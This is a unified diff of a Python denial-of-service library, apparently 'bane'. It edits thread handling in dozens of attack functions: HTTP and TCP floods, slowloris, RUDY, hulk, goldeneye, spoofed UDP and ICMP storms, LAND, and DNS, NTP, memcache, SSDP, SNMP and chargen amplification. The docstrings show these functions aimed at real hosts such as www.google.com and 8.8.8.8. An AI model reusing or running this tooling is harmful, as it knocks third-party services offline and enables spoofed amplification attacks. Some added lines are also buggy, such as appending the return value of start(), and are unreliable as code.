@@ -190,6 +190,7 @@ class tcflood(threading.Thread):
   maxtime: (set by default to: 5) timeout flag
 '''
 def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+ thr=[]
  global minsize
  minsize=min_size
  global maxsize
@@ -226,6 +227,7 @@ def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,ro
  for x in range(threads):
   t=tcflood()
   t.start()
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -238,6 +240,8 @@ def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,ro
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  if returning==True:
   return tcp_counter
 class htflood(threading.Thread):
@@ -353,6 +357,7 @@ def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500
    >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)
 
 '''
+ thr=[]
  global postfmin
  postfmin=post_field_min
  global postfmax
@@ -394,6 +399,7 @@ def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500
  for x in range(threads):
   t=htflood()
   t.start()
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -406,6 +412,8 @@ def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  if returning==True:
   return http_counter
 class prflood(threading.Thread):
@@ -521,6 +529,7 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,pos
    >>>bane.lulzer('www.google.com',p=80,threads=500)
 
 '''
+ thr=[]
  global postfmin
  postfmin=post_field_min
  global postfmax
@@ -574,6 +583,7 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,pos
  for x in range(threads):
   t=prflood()
   t.start()
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -586,6 +596,8 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,pos
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  if returning==True:
   return lulzer_counter
 class reqpost(threading.Thread):
@@ -648,6 +660,7 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,
     >>>bane.torshammer('www.google.com',p=80,settor=True)
 
 '''
+ thr=[]
  global maxcontent
  maxcontent=max_content
  global mincontent
@@ -667,6 +680,7 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,
  for x in range(threads):
      t =reqpost()
      t.start()
+     t.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -679,6 +693,8 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
 class pham(threading.Thread):
  def run(self):
   self.target=target
@@ -741,6 +757,7 @@ def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,
   >>>import bane
   >>>bane.proxhammer('www.google.com',threads=256)
 '''
+ thr=[]
  global maxcontent
  maxcontent=max_content
  global mincontent
@@ -774,6 +791,7 @@ def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,
  for j in range(threads):
     t=pham()
     t.start()
+    thr.append(t)
     time.sleep(.001)
  c=time.time()
  while True:
@@ -787,6 +805,8 @@ def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
 class rudypost(threading.Thread):
  def run(self):
   self.r_wait=r_wait
@@ -861,6 +881,7 @@ def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,
     >>>bane.torshammer('www.google.com',p=80,settor=True)
 
 '''
+ thr=[]
  global r_wait
  r_wait=wait
  global r_max
@@ -892,6 +913,7 @@ def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,
  for x in range(threads):
      t =rudypost()
      t.start()
+     thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -904,6 +926,8 @@ def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
 class xer(threading.Thread):
  def run(self):
   x=pointer
@@ -952,6 +976,7 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
   >>>bane.xerxes('www.google.com',threads=256)
 
 '''
+ thr=[]
  global tor
  tor=settor
  global stop
@@ -969,6 +994,7 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
     pointer=j
     t=xer()
     t.start()
+    thr.append(t)
     time.sleep(.001)
  c=time.time()
  while True:
@@ -982,6 +1008,8 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
 class pxer(threading.Thread):
  def run(self):
   global counter
@@ -1033,6 +1061,7 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
   >>>import bane
   >>>bane.proxhammer('www.google.com',threads=256)
 '''
+ thr=[]
  global speed
  speed=level
  global httplist
@@ -1066,6 +1095,7 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
     pointer=j
     t=pxer()
     t.start()
+    thr.append(t)
     time.sleep(.001)
  c=time.time()
  while True:
@@ -1079,6 +1109,8 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
 class slrd(threading.Thread):
  def run(self):
   self.target=target
@@ -1149,6 +1181,7 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
    >>>bane.slowread('www.google.com',p=443,threads=300,maxtime=7)
 
 '''
+ thr=[]
  global tor
  tor=settor
  global stop
@@ -1172,6 +1205,7 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
  for x in range(threads):
   t= slrd()
   t.start()
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -1184,6 +1218,8 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
 class apa(threading.Thread):
  def run(self):
   global apache_killer_counter
@@ -1279,6 +1315,7 @@ class ptc(threading.Thread):
    except Exception as e:
     pass
 def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,returning=False,settor=False):
+ thr=[]
  global proxslow_counter
  proxslow_counter=0
  global httplist
@@ -1319,6 +1356,7 @@ def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,http
  for x in range(threads):
   t=ptc()
   t.start()
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -1331,6 +1369,8 @@ def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,http
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  if returning==True:
   return proxslow_counter
 def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
@@ -1350,6 +1390,7 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
    >>>bane.apache_killer('www.google.com',p=80)
 
 '''
+ thr=[]
  global apache_killer_counter
  apache_killer_counter=0
  global tor
@@ -1380,7 +1421,7 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
  elif level>=5:
   speed=0.001
  for x in range(threads):
-  apa().start()
+  thr.append(apa().start())
  c=time.time()
  while True:
   if stop==True:
@@ -1393,6 +1434,8 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  if returning==True:
   return apache_killer_counter
 class loris(threading.Thread):
@@ -1468,6 +1511,7 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
    maxtime: (set by default to: 5) connection timeout flag 
 
 '''
+ thr=[]
  global slowloris_counter
  slowloris_counter=0
  global tor
@@ -1485,6 +1529,7 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
  for x in range(threads):
   t=loris()
   t.start()
+  thr.append(t)
   time.sleep(.01)
  c=time.time()
  while True:
@@ -1498,6 +1543,8 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  print('')
 class plor(threading.Thread):
  def run(self):
@@ -1562,6 +1609,7 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
   >>>import bane
   >>>bane.proxhammer('www.google.com',threads=256)
 '''
+ thr=[]
  global speed
  speed=level
  global httplist
@@ -1593,6 +1641,7 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
  for j in range(threads):
     t=plor()
     t.start()
+    thr.append(t)
     time.sleep(.001)
  c=time.time()
  while True:
@@ -1606,6 +1655,8 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
 class phu(threading.Thread):
  def run(self):
   global proxhulk_counter
@@ -1705,6 +1756,7 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
    >>>bane.hulk('www.google.com',threads=1000)
 
 '''
+ thr=[]
  global hulk_counter
  hulk_counter=0
  if settor==True:
@@ -1721,6 +1773,7 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
  for x in range(threads):
   t= hu()
   t.start()
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -1733,6 +1786,8 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  if returning==True:
   return hulk_counter
 def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returning=False):
@@ -1753,6 +1808,7 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
    >>>bane.proxhulk('www.google.com')
 
 '''
+ thr=[]
  global proxhulk_counter
  proxhulk_counter=0
  global stop
@@ -1771,6 +1827,7 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
  for x in range(threads):
    t=phu()
    t.start()
+   thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -1783,6 +1840,8 @@ def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returnin
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+  del x
  if returning==True:
   return proxhulk_counter
 def checksum(msg):
@@ -1941,6 +2000,7 @@ def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-
    >>>bane.synflood('8.8.8.8',syn=0,ack=1)
 
 '''
+  thr=[]
   global minsize
   minsize=min_size
   global maxsize
@@ -2018,6 +2078,7 @@ def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-
    for x in range(threads):
     t= sflood()
     t.start()
+    thr.append(t)
    c=time.time()
    while True:
     if stop==True:
@@ -2030,6 +2091,8 @@ def synflood(u,p=80,limiting=True,min_size=1,max_size=1400,level=1,source_port=-
     except KeyboardInterrupt:
      stop=True
      break
+   for x in thr:
+    del x
    if returning==True:
     return synflood_counter  
 class udpsp(threading.Thread):
@@ -2077,6 +2140,7 @@ def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None
  '''
    this function is for UDP flood attack using spoofed sources
 '''
+ thr=[]
  global minsize
  minsize=min_size
  global maxsize
@@ -2124,7 +2188,7 @@ def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   udpsp().start()
+   thr.append(udpsp().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2137,6 +2201,8 @@ def udpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=None
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return udpstorm_counter
 class ln(threading.Thread):
@@ -2220,6 +2286,7 @@ def land(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,threads=100,max_w
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
+ thr=[]
  global maxsize
  maxsize=max_size
  global minsize
@@ -2275,7 +2342,7 @@ def land(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,threads=100,max_w
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   ln().start()
+   thr.append(ln().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2288,6 +2355,8 @@ def land(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,threads=100,max_w
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return land_counter
 class dampli(threading.Thread):
@@ -2329,6 +2398,7 @@ def dnsamplif(u,p=80,limiting=True,level=1,dnslist=[],threads=100,q='ANY',interv
    >>>bane.dnsamplif('8.8.8.8',dnslist=a)
 
 '''
+ thr=[]
  global speed
  if level<=1:
   speed=0.1
@@ -2370,7 +2440,7 @@ def dnsamplif(u,p=80,limiting=True,level=1,dnslist=[],threads=100,q='ANY',interv
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   dampli().start()
+   thr.append(dampli().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2383,6 +2453,8 @@ def dnsamplif(u,p=80,limiting=True,level=1,dnslist=[],threads=100,q='ANY',interv
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return dnsamplif_counter
 class nampli(threading.Thread):
@@ -2422,6 +2494,7 @@ def ntpamplif(u,p=80,limiting=True,level=1,ntplist=[],threads=100,interval=300,l
    >>>bane.ntpamplif('8.8.8.8',ntplist=a)
 
 '''
+ thr=[]
  global ntpamplif_counter
  global speed
  if level<=1:
@@ -2455,7 +2528,7 @@ def ntpamplif(u,p=80,limiting=True,level=1,ntplist=[],threads=100,interval=300,l
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   nampli().start()
+   thr.append(nampli().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2468,6 +2541,8 @@ def ntpamplif(u,p=80,limiting=True,level=1,ntplist=[],threads=100,interval=300,l
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return ntpamplif_counter
 class memampli(threading.Thread):
@@ -2507,6 +2582,7 @@ def memcacheamplif(u,p=80,limiting=True,level=1,memlist=[],threads=100,interval=
    >>>bane.memcacheamplif('8.8.8.8',memlist=a)
 
 '''
+ thr=[]
  global memcacheamplif_counter
  memcacheamplif_counter=0
  global speed
@@ -2540,7 +2616,7 @@ def memcacheamplif(u,p=80,limiting=True,level=1,memlist=[],threads=100,interval=
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   memampli().start()
+   thr.append(memampli().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2553,6 +2629,8 @@ def memcacheamplif(u,p=80,limiting=True,level=1,memlist=[],threads=100,interval=
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return memcacheamplif_counter
 class charampli(threading.Thread):
@@ -2592,6 +2670,7 @@ def chargenamplif(u,p=80,limiting=True,level=1,chargenlist=[],threads=100,interv
    >>>bane.chargenamplif('8.8.8.8',ntplist=a)
 
 '''
+ thr=[]
  global chargenamplif_counter
  chargenamplif_counter=0
  global speed
@@ -2625,7 +2704,7 @@ def chargenamplif(u,p=80,limiting=True,level=1,chargenlist=[],threads=100,interv
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   charampli().start()
+   thr.append(charampli().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2638,6 +2717,8 @@ def chargenamplif(u,p=80,limiting=True,level=1,chargenlist=[],threads=100,interv
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return chargenamplif_counter
 class ssampli(threading.Thread):
@@ -2677,6 +2758,7 @@ def ssdpamplif(u,p=80,limiting=True,level=1,ssdplist=[],threads=100,interval=300
    >>>bane.ssdpamplif('8.8.8.8',ntplist=a)
 
 '''
+ thr=[]
  global ssdpamplif_counter
  ssdpamplif_counter=0
  global speed
@@ -2710,7 +2792,7 @@ def ssdpamplif(u,p=80,limiting=True,level=1,ssdplist=[],threads=100,interval=300
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   ssampli().start()
+   thr.append(ssampli().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2723,6 +2805,8 @@ def ssdpamplif(u,p=80,limiting=True,level=1,ssdplist=[],threads=100,interval=300
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return ssdpamplif_counter
 class snampli(threading.Thread):
@@ -2762,6 +2846,7 @@ def snmpamplif(u,p=80,limiting=True,level=1,snmplist=[],threads=100,interval=300
    >>>bane.snmpamplif('8.8.8.8',snmplist=a)
 
 '''
+ thr=[]
  global snmpamplif_counter
  snmpamplif_counter=0
  global speed
@@ -2795,7 +2880,7 @@ def snmpamplif(u,p=80,limiting=True,level=1,snmplist=[],threads=100,interval=300
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   snampli().start()
+   thr.append(snampli().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2808,6 +2893,8 @@ def snmpamplif(u,p=80,limiting=True,level=1,snmplist=[],threads=100,interval=300
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return snmpamplif_counter
 class echst(threading.Thread):
@@ -2842,6 +2929,7 @@ def echo_ref(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,pinglist=[],t
  '''
    this function is for ECHO  reflection attack
 '''
+ thr=[]
  global minsize
  minsize=min_size
  global maxsize
@@ -2879,7 +2967,7 @@ def echo_ref(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,pinglist=[],t
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   echst().start()
+   thr.append(echst().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2892,6 +2980,8 @@ def echo_ref(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,pinglist=[],t
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return echo_ref_counter
 class icmpcl(threading.Thread):
@@ -2927,6 +3017,7 @@ def icmp(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,min_ttl=64,max_tt
  '''
    this function is for ICMP flood attack
 '''
+ thr=[]
  global maxsize
  maxsize=max_size
  global minsize
@@ -2966,7 +3057,7 @@ def icmp(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,min_ttl=64,max_tt
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   icmpcl().start()
+   thr.append(icmpcl().start())
   c=time.time()
   while True:
    if stop==True:
@@ -2979,6 +3070,8 @@ def icmp(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,min_ttl=64,max_tt
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return icmp_counter
 class icmpst(threading.Thread):
@@ -3018,6 +3111,7 @@ def icmpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=Non
  '''
    this function is for ICMP flood with spoofed sources
 '''
+ thr=[]
  global minsize
  minsize=min_size
  global maxsize
@@ -3059,7 +3153,7 @@ def icmpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=Non
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   icmpst().start()
+   thr.append(icmpst().start())
   c=time.time()
   while True:
    if stop==True:
@@ -3072,6 +3166,8 @@ def icmpstorm(u,p=80,min_size=1,max_size=1400,limiting=True,level=1,ip_range=Non
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return icmpstorm_counter
 class blnu(threading.Thread):
@@ -3105,6 +3201,7 @@ def blacknurse(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,
  '''
    this function is for "black nurse" attack
 '''
+ thr=[]
  global blacknurse_counter
  blacknurse_counter=0
  global speed
@@ -3144,7 +3241,7 @@ def blacknurse(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,
   print("[-]Socket could not be created: permission denied!!\n(you need root privileges)")
  if wh>0:  
   for x in range(threads):
-   blnu().start()
+   thr.append(blnu().start())
   c=time.time()
   while True:
    if stop==True:
@@ -3157,6 +3254,8 @@ def blacknurse(u,p=80,limiting=True,level=1,ip_range=None,min_ttl=64,max_ttl=64,
    except KeyboardInterrupt:
     stop=True
     break
+  for x in thr:
+   del x
   if returning==True:
     return blacknurse_counter
 class gldn(threading.Thread):
@@ -3251,6 +3350,7 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
    3=>randomly: GET & POST
 
 '''
+ thr=[]
  global goldeneye_counter
  goldeneye_counter=0
  global stop
@@ -3268,6 +3368,7 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
  for x in range(threads):
   t=gldn()
   t.start()
+  thr.append(t)
  c=time.time()  
  while True:
   if stop==True:
@@ -3280,6 +3381,8 @@ def goldeneye(u,p=80,threads=700,meth=3,maxtime=5,interval=300,logs=True,returni
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+   del x
  if returning==True:
     return goldeneye_counter
 class dosecl(threading.Thread):
@@ -3421,6 +3524,7 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
  '''
   this function is for doser.py attack tool which uses requests module instead of httplib.
 '''
+ thr=[]
  global doser_counter
  doser_counter=0
  global tor
@@ -3438,6 +3542,7 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
  for x in range(threads):
   t=dosecl()
   t.start() 
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -3450,9 +3555,11 @@ def doser(u,threads=700,meth=1,maxtime=5,interval=300,logs=True,returning=False,
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+   del x
  if returning==True:
     return doser_counter
-class pdose(threading.Thread):
+class prdose(threading.Thread):
  def run(self):
   global proxdoser_counter 
   self.target=target
@@ -3540,6 +3647,7 @@ def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,r
  '''
    this is the advanced version of doser.py using http proxies.
 '''
+ thr=[]
  global proxdoser_counter
  proxdoser_counter=0
  global stop
@@ -3558,8 +3666,9 @@ def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,r
  global timeout
  timeout=maxtime
  for x in range(threads):
-  t=pdose()
+  t=prdose()
   t.start()
+  thr.append(t)
  c=time.time()
  while True:
   if stop==True:
@@ -3572,6 +3681,8 @@ def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5,interval=300,logs=True,r
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+   del x
  if returning==True:
     return proxdoser_counter
 class atcf(threading.Thread):
@@ -3648,6 +3759,7 @@ class cooi(threading.Thread):
    pass
   ier+=1
 def cki():
+ thr=[]
  global flag
  flag=-1
  global ier
@@ -3655,12 +3767,15 @@ def cki():
  print("[+]Getting yummy hot cookies...")
  for x in range(10):
   flag+=1
-  cooi().start()
+  thr.append(cooi().start())
   time.sleep(.01)
  while(ier!=10):
    time.sleep(.1)
  time.sleep(1)
+ for x in thr:
+   del x
 def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,returning=False):
+ thr=[]
  global cf_doser_counter
  cf_doser_counter=0
  global prints
@@ -3696,7 +3811,7 @@ def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,r
  else:
   ual=ue[:]
  for x in range(threads):
-  atcf().start()
+  thr.append(atcf().start())
   time.sleep(.001)
  c=time.time()
  while True:
@@ -3710,6 +3825,8 @@ def cfkill(u,threads=500,maxtime=5,check=True,cook=True,interval=300,logs=True,r
   except KeyboardInterrupt:
    stop=True
    break
+ for x in thr:
+   del x
  if returning==True:
     return cf_doser_counter
 def cfkiller(u,threads=500,maxtime=5,interval=300,logs=True,returning=False,wait=10):
